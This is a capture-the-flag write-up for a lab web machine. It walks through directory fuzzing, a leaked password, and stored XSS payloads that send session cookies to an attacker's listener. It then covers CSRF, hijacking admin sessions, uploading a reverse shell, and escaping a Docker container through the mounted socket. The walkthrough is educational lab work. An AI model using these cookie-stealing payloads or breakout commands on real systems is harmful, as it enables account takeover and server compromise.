
# PORT SCAN
---

| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |

# RECONNAISSANCE
---

Let's add `review.thm` to `/etc/hosts`:

```bash
echo 'IP review.thm' | sudo tee -a /etc/hosts
```

Let's go to the web application:

![Pasted image 20250922171819.png](../../IMAGES/Pasted%20image%2020250922171819.png)

We got a login page but we can't register, time to fuzz then:

```python
dirsearch -u http://review.thm -e php,txt,xml,html,zip,bak -t 100 -r --deep-recursive

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, xml, html, zip, bak | HTTP method: GET | Threads: 100 | Wordlist size: 11967

Output File: /home/kali/thm/sequence/reports/http_review.thm/_25-09-19_18-18-07.txt

Target: http://review.thm/

[18:18:07] Starting: 
[18:18:17] 403 -  275B  - /.ht_wsr.txt
[18:18:17] 403 -  275B  - /.htaccess.sample
[18:18:17] 403 -  275B  - /.htaccess.orig
[18:18:17] 403 -  275B  - /.htaccess.save
[18:18:17] 403 -  275B  - /.htaccess.bak1
[18:18:17] 403 -  275B  - /.htaccess_extra
[18:18:17] 403 -  275B  - /.htaccess_orig
[18:18:17] 403 -  275B  - /.htaccess_sc
[18:18:17] 403 -  275B  - /.htaccessBAK
[18:18:17] 403 -  275B  - /.htaccessOLD
[18:18:17] 403 -  275B  - /.htaccessOLD2
[18:18:17] 403 -  275B  - /.htm
[18:18:17] 403 -  275B  - /.html
[18:18:17] 403 -  275B  - /.htpasswd_test
[18:18:17] 403 -  275B  - /.httr-oauth
[18:18:17] 403 -  275B  - /.htpasswds
[18:18:18] 403 -  275B  - /.php
[18:18:34] 302 -    0B  - /chat.php  ->  login.php
[18:18:36] 200 -  764B  - /contact.php
[18:18:37] 302 -    1KB - /dashboard.php  ->  login.php
[18:18:37] 200 -    0B  - /db.php
[18:18:43] 200 -  576B  - /header.php
[18:18:45] 301 -  313B  - /javascript  ->  http://review.thm/javascript/
Added to the queue: javascript/
[18:18:47] 200 -  747B  - /login.php
[18:18:48] 302 -    0B  - /logout.php  ->  index.php
[18:18:48] 200 -  450B  - /mail/
[18:18:48] 301 -  307B  - /mail  ->  http://review.thm/mail/
Added to the queue: mail/
[18:18:51] 200 -  357B  - /new.html
[18:18:55] 301 -  313B  - /phpmyadmin  ->  http://review.thm/phpmyadmin/
Added to the queue: phpmyadmin/
[18:18:56] 200 -    3KB - /phpmyadmin/doc/html/index.html
Added to the queue: phpmyadmin/doc/, phpmyadmin/doc/html/
[18:18:57] 200 -    3KB - /phpmyadmin/
[18:18:57] 200 -    3KB - /phpmyadmin/index.php
[18:19:01] 403 -  275B  - /server-status/
[18:19:01] 403 -  275B  - /server-status
[18:19:01] 302 -    0B  - /settings.php  ->  login.php
Added to the queue: server-status/
[18:19:09] 200 -  403B  - /uploads/
[18:19:09] 301 -  310B  - /uploads  ->  http://review.thm/uploads/
Added to the queue: uploads/

[18:19:23] Starting: javascript/

[18:20:30] Starting: mail/
[18:20:36] 403 -  275B  - /mail/.ht_wsr.txt
[18:20:36] 403 -  275B  - /mail/.htaccess.orig
[18:20:36] 403 -  275B  - /mail/.htaccess.sample
[18:20:36] 403 -  275B  - /mail/.htaccess.save
[18:20:36] 403 -  275B  - /mail/.htaccess_orig
[18:20:36] 403 -  275B  - /mail/.htaccess_extra
[18:20:36] 403 -  275B  - /mail/.htaccessBAK
[18:20:36] 403 -  275B  - /mail/.htaccessOLD
[18:20:36] 403 -  275B  - /mail/.htaccess_sc
[18:20:36] 403 -  275B  - /mail/.htaccessOLD2
[18:20:36] 403 -  275B  - /mail/.html
[18:20:36] 403 -  275B  - /mail/.httr-oauth
[18:20:36] 403 -  275B  - /mail/.htpasswd_test
[18:20:36] 403 -  275B  - /mail/.htpasswds
[18:20:36] 403 -  275B  - /mail/.htm
[18:20:36] 403 -  275B  - /mail/.htaccess.bak1
[18:20:37] 403 -  275B  - /mail/.php
[18:20:58] 200 -  442B  - /mail/dump.txt

[18:21:38] Starting: phpmyadmin/
[18:21:43] 403 -  275B  - /phpmyadmin/.ht_wsr.txt
[18:21:43] 403 -  275B  - /phpmyadmin/.htaccess.bak1
[18:21:43] 403 -  275B  - /phpmyadmin/.htaccess.orig
[18:21:43] 403 -  275B  - /phpmyadmin/.htaccess.save
[18:21:43] 403 -  275B  - /phpmyadmin/.htaccess.sample
[18:21:43] 403 -  275B  - /phpmyadmin/.htaccess_extra
[18:21:43] 403 -  275B  - /phpmyadmin/.htaccess_orig
[18:21:43] 403 -  275B  - /phpmyadmin/.htaccess_sc
[18:21:43] 403 -  275B  - /phpmyadmin/.htaccessOLD2
[18:21:43] 403 -  275B  - /phpmyadmin/.htaccessBAK
[18:21:43] 403 -  275B  - /phpmyadmin/.htaccessOLD
[18:21:43] 403 -  275B  - /phpmyadmin/.htm
[18:21:43] 403 -  275B  - /phpmyadmin/.html
[18:21:43] 403 -  275B  - /phpmyadmin/.htpasswds
[18:21:43] 403 -  275B  - /phpmyadmin/.htpasswd_test
[18:21:43] 403 -  275B  - /phpmyadmin/.httr-oauth
[18:21:44] 403 -  275B  - /phpmyadmin/.php
[18:22:02] 301 -  317B  - /phpmyadmin/doc  ->  http://review.thm/phpmyadmin/doc/
[18:22:02] 403 -  275B  - /phpmyadmin/doc/
[18:22:04] 200 -   22KB - /phpmyadmin/favicon.ico
[18:22:08] 403 -  275B  - /phpmyadmin/js/
[18:22:08] 301 -  316B  - /phpmyadmin/js  ->  http://review.thm/phpmyadmin/js/
[18:22:08] 200 -    7KB - /phpmyadmin/js/config.js
Added to the queue: phpmyadmin/js/
[18:22:09] 403 -  275B  - /phpmyadmin/libraries/tinymce
[18:22:09] 403 -  275B  - /phpmyadmin/libraries/
[18:22:09] 403 -  275B  - /phpmyadmin/libraries/phpmailer/
[18:22:09] 403 -  275B  - /phpmyadmin/libraries
[18:22:09] 403 -  275B  - /phpmyadmin/libraries/tiny_mce/
[18:22:09] 403 -  275B  - /phpmyadmin/libraries/tinymce/
[18:22:09] 403 -  275B  - /phpmyadmin/libraries/tiny_mce
Added to the queue: phpmyadmin/libraries/
Added to the queue: phpmyadmin/libraries/phpmailer/
Added to the queue: phpmyadmin/libraries/tiny_mce/
Added to the queue: phpmyadmin/libraries/tinymce/
[18:22:20] 301 -  317B  - /phpmyadmin/sql  ->  http://review.thm/phpmyadmin/sql/
```

We can see a lot of stuff here, for example, going to `/mail/dump.txt` uncovers the following:

![Pasted image 20250922171811.png](../../IMAGES/Pasted%20image%2020250922171811.png)

We got the following message:

```
From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment

Hi Team,

I have successfully updated the code. The Lottery and Finance panels have also been created.

Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.

For now, access is protected with a completed 8-character alphanumeric password (S60u}f5j), in order to restrict exposure and safeguard details regarding our potential investors.

I will be away on holiday but will be back soon.

Regards,  
Robert
```

The message says a developer named `Robert` has created a lottery and finance panels which are hosted on the internal network, which could point to a possible SSRF or something similar, we also got a password for these panels:

```
S60u}f5j
```

Let's check other functionalities on the web application, if we send a message to `contact us`, it says that someone from the team will review our message shortly:

![Pasted image 20250922171806.png](../../IMAGES/Pasted%20image%2020250922171806.png)

I tried OOB XSS here but no luck, server doesn't send the connection so this contact form may not be vulnerable to XSS:

```JS
<img src=x onerror="new Image().src='http://10.14.21.28:8000/exfil?cookie='+encodeURIComponent(document['cookie'])">
```


![Pasted image 20250922171803.png](../../IMAGES/Pasted%20image%2020250922171803.png)

Going to `new.html` uncovers the following:

![Pasted image 20250922171756.png](../../IMAGES/Pasted%20image%2020250922171756.png)

We can see the following code:

```html
HTTP/1.1 200 OK
Date: Fri, 19 Sep 2025 22:45:18 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Thu, 05 Jun 2025 19:28:09 GMT
ETag: "232-636d81d222625-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 562
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Malicious Page</title>
    <script type="text/javascript">
        window.onload = function() {
            document.forms["attackForm"].submit();
        }
    </script>
</head>

<body>
    <p>If you are not redirected automatically, press the Submit button.</p>
    <form id="attackForm" action="http://review.thm/promote_coadmin.php" method="POST">
        <input type="hidden" name="username" value="mod" />
        <input type="submit" value="Submit" />
    </form>
</body>

</html>
```

The page automatically submits a form via `windows.onload`, it targets `http://review.thm/promote_coadmin.php` with a POST request and attempts to promote the user `mod` to co-admin privileges, this seems like a typical CSRF scenario, if an authenticated admin visits the page, it would automatically execute, but we need an admin to visit the page, how can we do that?

Well, let's proceed with exploitation.


# EXPLOITATION
---

Remember the contact form we got on the main page, well, this contact form is vulnerable to Stored XSS, the message saying the team will review the messages shortly after basically hint at that, I tried the box on release day and the day after release day but couldn't manage the XSS to trigger no matter which payload I used, I decided to tackle the box once again after three days and somehow it decided to work with a simple xss payload I used before but didn't work, I got no clue why the machine behaved like that but without further ado, let's proceed.

Ok, we got stored XSS on the message field on the contact form, let's test it:

```js
<script src="http://10.14.21.28:8000/test"></script>
```

![Pasted image 20250922171749.png](../../IMAGES/Pasted%20image%2020250922171749.png)

If we check our python server, we notice the request being made:

![Pasted image 20250922171745.png](../../IMAGES/Pasted%20image%2020250922171745.png)

We need to use this XSS to steal the cookie of the user reviewing the message, let's craft a payload for it, you can use the following payload, I'll change the port so we only receive the cookie on it:

```js
<script>var i=new Image();i.src="http://10.14.21.28:9000/?c="+document.cookie;</script>
```

![Pasted image 20250922171741.png](../../IMAGES/Pasted%20image%2020250922171741.png)

Checking our python server, we can see the cookie being sent:

![Pasted image 20250922171737.png](../../IMAGES/Pasted%20image%2020250922171737.png)

I got:

```
PHPSESSID=ouukqg65411m3apojnh1fnj6ek
```

Let's set up the cookie on our browser and go to `dashboard.php`:

![Pasted image 20250922171732.png](../../IMAGES/Pasted%20image%2020250922171732.png)

![Pasted image 20250922171729.png](../../IMAGES/Pasted%20image%2020250922171729.png)

We got our first flag:

```
THM{M0dH@ck3dPawned007}
```

Once we're here, we can notice the admin user, remember how I talked about CSRF that would elevate our user into admin if an administrator user visited the page, we got some functionalities, we can view feedback, which is the functionality that got us the admin cookie, we can change our settings and chat, going into the settings reveal this:

![Pasted image 20250922171724.png](../../IMAGES/Pasted%20image%2020250922171724.png)

Here's the promote Co-admin functionality, if we try putting mod, we get the same response that's on the endpoint:

![Pasted image 20250922171717.png](../../IMAGES/Pasted%20image%2020250922171717.png)

So we need to exploit the CSRF, before we do that, let's change the password for mod in case it works further on:

```
mod / Passw0rd123
```

Going into chats, reveal an user named `Alice` and our admin user:

![Pasted image 20250922171657.png](../../IMAGES/Pasted%20image%2020250922171657.png)

We can't switch chats so I believe we need to exploit the CSRF here, we also notice some sort of filter which filters some dangerous keywords on the message:

![Pasted image 20250922171653.png](../../IMAGES/Pasted%20image%2020250922171653.png)

For example, if we put `onerror`, this happens:

![Pasted image 20250922171648.png](../../IMAGES/Pasted%20image%2020250922171648.png)

So we need a way to bypass these filters and make the CSRF trigger, I tried a lot of bypasses but it seems the filter is properly implemented and we can't get to bypass it, but, if we put a simple link to our python server as we did before, we notice the request going through:

![Pasted image 20250922171543.png](../../IMAGES/Pasted%20image%2020250922171543.png)

![Pasted image 20250922171513.png](../../IMAGES/Pasted%20image%2020250922171513.png)

It seems the admin is accessing any URL we put in here without checking, maybe if he visits the page where the stored XSS is located on the page, we could steal his cookie too, let's try, first of all, let's check where the payloads are stored, let's go to the feedback functionality:

![Pasted image 20250922171508.png](../../IMAGES/Pasted%20image%2020250922171508.png)

The endpoint is `admin_view.php`, let's make the admin visit the page and start a python listener on the same port we used before:

![Pasted image 20250922171504.png](../../IMAGES/Pasted%20image%2020250922171504.png)

If we check our listener, we check that two cookies are being sent:

![Pasted image 20250922171459.png](../../IMAGES/Pasted%20image%2020250922171459.png)

We got:

```
python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
10.201.111.159 - - [22/Sep/2025 17:11:01] "GET /?c=PHPSESSID=ouukqg65411m3apojnh1fnj6ek HTTP/1.1" 200 -
10.201.111.159 - - [22/Sep/2025 17:11:04] "GET /?c=PHPSESSID=ouukqg65411m3apojnh1fnj6ek HTTP/1.1" 200 -
10.201.111.159 - - [22/Sep/2025 17:11:06] "GET /?c=PHPSESSID=ouukqg65411m3apojnh1fnj6ek HTTP/1.1" 200 -
10.201.111.159 - - [22/Sep/2025 17:11:09] "GET /?c=PHPSESSID=ouukqg65411m3apojnh1fnj6ek HTTP/1.1" 200 -
10.201.111.159 - - [22/Sep/2025 17:11:11] "GET /?c=PHPSESSID=ouukqg65411m3apojnh1fnj6ek HTTP/1.1" 200 -
10.201.111.159 - - [22/Sep/2025 17:11:14] "GET /?c=PHPSESSID=ouukqg65411m3apojnh1fnj6ek HTTP/1.1" 200 -
10.201.111.159 - - [22/Sep/2025 17:11:16] "GET /?c=PHPSESSID=ouukqg65411m3apojnh1fnj6ek HTTP/1.1" 200 -
10.201.111.159 - - [22/Sep/2025 17:11:19] "GET /?c=PHPSESSID=ouukqg65411m3apojnh1fnj6ek HTTP/1.1" 200 -
10.201.111.159 - - [22/Sep/2025 17:11:21] "GET /?c=PHPSESSID=ouukqg65411m3apojnh1fnj6ek HTTP/1.1" 200 -
10.201.111.159 - - [22/Sep/2025 17:11:23] "GET /?c=PHPSESSID=ufu544mqvgdlmttqk40gvqjkbg HTTP/1.1" 200 -
10.201.111.159 - - [22/Sep/2025 17:11:24] "GET /?c=PHPSESSID=ouukqg65411m3apojnh1fnj6ek HTTP/1.1" 200 -
10.201.111.159 - - [22/Sep/2025 17:11:26] "GET /?c=PHPSESSID=ouukqg65411m3apojnh1fnj6ek HTTP/1.1" 200 -
10.201.111.159 - - [22/Sep/2025 17:11:29] "GET /?c=PHPSESSID=ouukqg65411m3apojnh1fnj6ek HTTP/1.1" 200 -
10.201.111.159 - - [22/Sep/2025 17:11:31] "GET /?c=PHPSESSID=ouukqg65411m3apojnh1fnj6ek HTTP/1.1" 200 -
10.201.111.159 - - [22/Sep/2025 17:11:34] "GET /?c=PHPSESSID=ouukqg65411m3apojnh1fnj6ek HTTP/1.1" 200 -
```

`ouukqg65411m3apojnh1fnj6ek` is the cookie for the `mod` user but what about `PHPSESSID=ufu544mqvgdlmttqk40gvqjkbg`, this is a cookie for another user, which means this is the admin user cookie, let's check if this is true then:

```
PHPSESSID=ufu544mqvgdlmttqk40gvqjkbg
```

![Pasted image 20250922171452.png](../../IMAGES/Pasted%20image%2020250922171452.png)

![Pasted image 20250922171449.png](../../IMAGES/Pasted%20image%2020250922171449.png)

We got access to the admin dashboard, got our flag too:

```
THM{Adm1NPawned007}
```

Let's promote `mod` to admin in case we need it further on:

![Pasted image 20250922171444.png](../../IMAGES/Pasted%20image%2020250922171444.png)

We got:

```
Array ( [username] => mod [csrf_token_promote] => 21232f297a57a5a743894a0e4a801fc3 ) 
```

Let's also change the password for admin:

```
admin / adminp4ss123
```

Let's begin privilege escalation then.


# PRIVILEGE ESCALATION
---

Checking the select feature, we find the `lottery feature` that the mail was talking about:

![Pasted image 20250922171440.png](../../IMAGES/Pasted%20image%2020250922171440.png)


![Pasted image 20250922171437.png](../../IMAGES/Pasted%20image%2020250922171437.png)

Let's check the request on burp:

![Pasted image 20250922171434.png](../../IMAGES/Pasted%20image%2020250922171434.png)

We notice the following format:

```http
------geckoformboundarye02606e17132e42063411082e97a4986

Content-Disposition: form-data; name="feature"



lottery.php

------geckoformboundarye02606e17132e42063411082e97a4986--
```

Remember the mail dump we found when we started, if you don't let's recall:

```
From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment

Hi Team,

I have successfully updated the code. The Lottery and Finance panels have also been created.

Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.

For now, access is protected with a completed 8-character alphanumeric password (S60u}f5j), in order to restrict exposure and safeguard details regarding our potential investors.

I will be away on holiday but will be back soon.

Regards,  
Robert
```

Since we can't access `lottery.php`, what about `finance.php`:

![Pasted image 20250922171424.png](../../IMAGES/Pasted%20image%2020250922171424.png)

Let's forward the request, we need to enter the password specified on the mail dump:

```
S60u}f5j
```

![Pasted image 20250922171418.png](../../IMAGES/Pasted%20image%2020250922171418.png)

We can see an investor finance table but we can also upload files down below, let's try to upload a simple webshell and check if it works:

![Pasted image 20250922171413.png](../../IMAGES/Pasted%20image%2020250922171413.png)


![Pasted image 20250922171409.png](../../IMAGES/Pasted%20image%2020250922171409.png)

Let's check the uploads folder then:

![Pasted image 20250922171404.png](../../IMAGES/Pasted%20image%2020250922171404.png)

It is not located at the external page but the internal one, let's do the same as we did to access the finance panel, we can do this:

```
uploads/powny.php
```

![Pasted image 20250922171349.png](../../IMAGES/Pasted%20image%2020250922171349.png)

Let's forward the request:

![Pasted image 20250922171346.png](../../IMAGES/Pasted%20image%2020250922171346.png)

I got an error on the `powny` webshell, but knowing we can upload any file without restrictions, let's simply upload a reverse shell and that's all:

![Pasted image 20250922171336.png](../../IMAGES/Pasted%20image%2020250922171336.png)

Now do the same as before and put:

```
uploads/shell.php
```

![Pasted image 20250922171331.png](../../IMAGES/Pasted%20image%2020250922171331.png)

If we check our listener, we get the connection:

![Pasted image 20250922171327.png](../../IMAGES/Pasted%20image%2020250922171327.png)

We're root but based on the hostname, we're inside of a docker container, let's use `deepce.sh` and `linpeas` then, if you're using penelope as your listener you can do the following to get them:

```
F12

run upload_privesc_scripts
```

![Pasted image 20250922171321.png](../../IMAGES/Pasted%20image%2020250922171321.png)

You can use this to go back to your session:

```
interact 1
```

Let's run the tools:

![Pasted image 20250922171315.png](../../IMAGES/Pasted%20image%2020250922171315.png)

We got some dangerous privileges enabled and docker sock is mounted, we got `cap_sys_module` as a capability, I exploited this capability back on the `voyage` machine on this same platform, you can check the writeup I did for that machine here:

- [Voyage WriteUp](https://github.com/smoothment/Hacking-Notes/blob/main/CYBERSECURITY/CTF/TRYHACKME/VOYAGE.md)

Let's check how I exploited this:

![Pasted image 20250922171309.png](../../IMAGES/Pasted%20image%2020250922171309.png)

![Pasted image 20250922171301.png](../../IMAGES/Pasted%20image%2020250922171301.png)

But, if we try to exploit this, we realize we're missing `insmod`, I tried some ways to make it work such as compiling from source and others but it didn't work, we lack the `/lib/modules` directory so we can't make it work too, let's go in other way, we also noticed that the `docker sock` is mounted based on the `deepce` scan, we can exploit this to achieve root access, let's read some articles about it:

https://medium.com/owasp-vitcc/docker-breakout-mounted-docker-socket-76cb77794158

https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation

![Pasted image 20250922171255.png](../../IMAGES/Pasted%20image%2020250922171255.png)

Let's use `docker images` to list the images available:

```docker
root@4f18a45cca05:/tmp# docker images
REPOSITORY      TAG       IMAGE ID       CREATED        SIZE
phpvulnerable   latest    d0bf58293d3b   3 months ago   926MB
php             8.1-cli   0ead645a9bc2   6 months ago   527MB
```

Let's try to escape the host using the `php` image:

```
docker run -it -v /:/host php:8.1-cli chroot /host bash
```

![Pasted image 20250922171251.png](../../IMAGES/Pasted%20image%2020250922171251.png)

We can see the flag on the root directory meaning we successfully escaped the container:

```
root@96951b5273c4:/# ls -la /root
total 68
drwxr-x--- 12 root root 4096 Jun  4 11:58  .
drwxr-xr-x 19 root root 4096 Sep 22 20:42  ..
lrwxrwxrwx  1 root root    9 Feb  4  2024  .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019  .bashrc
drwxr-xr-x  3 root root 4096 Feb  2  2024  .cache
drwx------  3 root root 4096 Feb  2  2024  .config
drwxr-xr-x  3 root root 4096 Nov 10  2021  .local
-rw-------  1 root root  131 Jun  4 10:18  .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019  .profile
-rw-r--r--  1 root root   66 Feb  1  2024  .selected_editor
drwx------  2 root root 4096 Nov 10  2021  .ssh
drwxr-xr-x  2 root root 4096 Feb  2  2024  bin
-rw-r--r--  1 root root   20 Jun  4 11:58  flag.txt
drwxr-xr-x  3 root root 4096 Feb  2  2024  lib
drwx------  7 root root 4096 Feb  2  2024  root
drwx------  4 root root 4096 Feb  2  2024  share
drwx------  4 root root 4096 Feb  2  2024  snap
drwx------  3 root root 4096 Feb  2  2024 '~'
```

Let's read the flag:

```
root@96951b5273c4:/# cat /root/flag.txt 
THM{rootAccessD0n3}
```

We got all flags, here they are:

```
THM{M0dH@ck3dPawned007}

THM{Adm1NPawned007}

THM{rootAccessD0n3}
```


![Pasted image 20250922171244.png](../../IMAGES/Pasted%20image%2020250922171244.png)

